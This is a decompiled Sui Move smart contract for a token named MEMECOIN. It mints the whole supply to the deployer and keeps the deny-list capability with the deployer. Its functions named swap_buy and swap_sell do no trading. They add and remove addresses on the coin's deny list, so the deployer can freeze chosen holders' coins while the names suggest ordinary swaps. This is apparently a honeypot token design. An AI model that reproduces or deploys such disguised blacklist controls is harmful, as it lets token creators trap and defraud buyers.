module 0xa9b5169beb3a4fc8efaa71e771fce69ce7fbe50d5b5e28e7ccc7103e5575296d::memecoin {
    struct MEMECOIN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MEMECOIN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MEMECOIN>(arg0, 9, b"MEMECOIN", b"MEMECOIN", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYyKagNe4M7iP1NqmvU8E6Tow8DaNKx3Asphk4AE1dpJ1"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MEMECOIN>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MEMECOIN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MEMECOIN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MEMECOIN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEMECOIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MEMECOIN>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEMECOIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MEMECOIN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

